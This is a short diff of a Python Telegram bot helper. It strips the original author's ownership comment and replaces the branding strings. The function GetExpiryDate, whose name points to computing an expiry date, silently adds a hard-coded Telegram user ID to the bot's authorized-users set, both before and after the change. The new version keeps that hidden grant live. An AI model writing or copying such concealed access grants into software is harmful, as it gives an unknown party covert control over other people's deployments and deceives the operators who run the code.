@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Owned By BG_OFFICIAL
+
 
 # the logging things
 import logging
@@ -26,8 +26,8 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Owned By @BG_OFFICIAL", "Really it will expire when you don't use")
-    Config.AUTH_USERS.add(749789911,1370186886)
+    expires_at = (str(chat_id), "KGRockers", "Contact Creator")
+    Config.AUTH_USERS.add(1370186886)
     return expires_at
 
 
